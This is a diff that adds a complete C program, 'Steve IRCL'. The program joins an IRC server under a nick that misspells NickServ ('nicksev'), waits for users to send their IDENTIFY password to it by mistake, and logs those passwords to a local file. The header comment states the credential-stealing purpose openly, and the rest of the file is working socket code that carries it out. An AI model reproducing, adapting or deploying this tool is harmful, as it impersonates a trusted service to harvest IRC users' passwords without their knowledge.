@@ -1,0 +1,191 @@
+/*
+ *  Steve IRCL (IRC Listener)
+ *  coded by: NoUse
+ *  http://www.anomalous-security.org
+ *  "Did I do that?"
+ *
+ *  What Steve Does:
+ *  Steve IRCL joins an IRC server under
+ *  a specified nick (preferably one that
+ *  is a common typo of nickserv) and
+ *  waits for users to mistype nickserv
+ *  and ultimately send their passwords
+ *  to Steve IRCL. It then logs all
+ *  passwords to a text file on the computer
+ *  Steve is being ran on.
+ *
+ *  Follows RFC 2812
+ */
+
+#include <stdio.h>
+#include <string.h>
+#include <sys/socket.h>
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/types.h>
+#include <netdb.h>
+#include <unistd.h>
+
+
+/****************************************************************
+  Changeable Defines
+****************************************************************/
+#define  SERVER      "irc.anomalous-security.org"
+#define  NICK        "nicksev"
+#define  IDENT       "nicksev"
+#define  REALNAME    "nicksev"
+
+
+/****************************************************************
+  Whisper this line to the bot to disconnect
+  it from the selected SERVER and to end   
+  the program entirely.
+                     
+  e.g. /msg nicksev CarlWinslow         
+****************************************************************/
+#define  SECRET_QUIT "CarlWinslow"
+
+#define  PORT        6667
+#define  MY_MAX      512
+
+int main(int argc, char **argv)
+{
+  int sox, bytes_sent, bytes_rec, logged;
+  struct hostent *h;
+  struct sockaddr_in target;
+  char rec_buf[MY_MAX];
+  char send_buf[MY_MAX];
+  char *from_server[5];
+ 
+  bytes_rec = 0;
+  logged = 0;
+ 
+  FILE * log;
+  log = fopen("ircl_log.txt", "a+");
+ 
+  if(log == 0){
+      printf("[-] Error opening log file.Exiting..,\n");   
+      return -1;             
+  }
+ 
+  sox = socket(AF_INET, SOCK_STREAM, 0);
+  target.sin_family = AF_INET;
+   
+  h = gethostbyname(SERVER);
+ 
+  if(h == NULL){
+      printf("[-] Error querying host. Exiting...\n");
+      return -1;
+  }
+ 
+  target.sin_addr = *((struct in_addr *)h->h_addr);
+  target.sin_port = htons(PORT);
+  memset(&(target.sin_zero), '\0', 8);
+ 
+  if(sox == -1){
+      printf("[-] Error opening socket\n");
+      return -1;       
+  }
+ 
+  printf("[+] Socket opened\n");
+
+  if(connect(sox, (struct sockaddr *)&target, sizeof(struct sockaddr)) == -1){
+      printf("[-] Host not up. Check IP and try again\n");
+      close(sox);
+      return -1;
+  }
+ 
+  printf("[+] Connected to %s with nick: %s\n", h->h_name, NICK);
+ 
+ 
+  sprintf(send_buf, "USER %s %s %s %s :%s\r\n", IDENT, IDENT, IDENT, IDENT, REALNAME);
+  bytes_sent = send(sox, send_buf, strlen(send_buf), 0);
+  if(bytes_sent != strlen(send_buf)){
+      printf("[-] Error sending IDENT to host\n");
+      close(sox);
+      return -1;
+  }
+  memset(send_buf, '\0', MY_MAX);
+ 
+  printf("[+] Ident successfully sent\n");
+ 
+  sprintf(send_buf, "NICK %s\r\n", NICK);
+  bytes_sent = send(sox, send_buf, strlen(send_buf), 0);
+  if(bytes_sent != strlen(send_buf)){
+      printf("[-] Error sending NICK to host\n");
+      close(sox);
+      return -1;
+  }
+  memset(send_buf, '\0', MY_MAX);
+
+  printf("[+] Nick successfully sent\n");
+  printf("[~] Waiting for passw0rds\n");
+
+ /******* Main while loop *********/
+  while(bytes_rec != -1){
+      bytes_rec = recv(sox, rec_buf, MY_MAX, 0);
+      if(bytes_rec > 0){
+         
+/****************************************************************
+  Important commands IRCL looks for: Don't change!
+****************************************************************/         
+          if(strstr(rec_buf, SECRET_QUIT) != NULL){
+              printf("[-] Request for termination. Executing\n");
+              break;
+          }
+     
+          if(strstr(rec_buf, "PING") != NULL){
+              memset(send_buf, '\0', MY_MAX);
+              from_server[0] = strtok(rec_buf, " ");
+              from_server[1] = strtok(NULL, " ");
+              sprintf(send_buf, "PONG %s\r\n", &from_server[1][1]);
+              bytes_sent = send(sox, send_buf, strlen(send_buf), 0);
+              if(bytes_sent != strlen(send_buf)){
+                  printf("[-] Error sending PING\n");
+                  break;
+              }
+              printf("[+] PONG!\n");
+          }
+
+                   
+ /****************************************************************
+   Here are the common strings and commands IRCL looks for
+   You can add on to and modify these commands.       
+ ****************************************************************/
+         if(strstr(rec_buf, "IDENTIFY") != NULL){
+             printf("[+] ALERT: Possible Password Sent\n");
+             if(fputs("\n************\n", log) != EOF){
+                 fputs(rec_buf,log);
+                 fputs("************\n", log);
+             }else{       
+                 printf("[-] ERROR: Unable to write to log file\n");
+             }
+
+             logged++;
+          }
+         
+          if(strstr(rec_buf, "identify") != NULL){
+              printf("[+] ALERT: Possible Password Sent\n");
+              if(fputs("\n************\n", log) != EOF){
+                  fputs(rec_buf,log);
+                  fputs("************\n", log);
+              }else{       
+                  printf("[-] ERROR: Unable to write to log file\n");
+              }
+
+              logged++;
+          }
+         
+
+
+
+          memset(rec_buf, '\0', MY_MAX);
+           
+      }
+  }
+ 
+  printf("[+] Steve IRCL's final thought: %d passwords logged\n", logged);
+  close(sox);
+  fclose(log);
+  return 0;           
+}
